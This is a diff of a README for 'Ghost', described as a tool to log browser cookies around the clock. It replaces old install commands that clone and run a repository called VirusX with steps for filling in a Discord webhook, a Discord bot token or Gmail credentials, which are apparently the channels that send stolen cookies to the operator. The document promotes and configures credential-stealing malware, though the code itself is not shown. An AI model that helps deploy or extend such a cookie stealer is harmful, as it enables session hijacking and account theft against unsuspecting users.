@@ -3,12 +3,13 @@
 ## Ghost is a tool to log browser cookies 24/7.
 ### Installation :
 **Download The File Ghost.py or simply copy and paste the data**
+**After that, open the file in an ide or code editor then use one of the following options** <br>
 ```
-$ apt update && apt upgrade
-$ apt install git
-$ pkg install python
-$ git clone https://github.com/TSMaitry/VirusX.git
-$ cd VirusX
-$ chmod +x VirusX.py
-$ python2 VirusX.py
+Insert Discord Webhook
+
+Insert Discord Bot Token
+
+Insert Gmail Account Details
+
+Insert Test
 ```
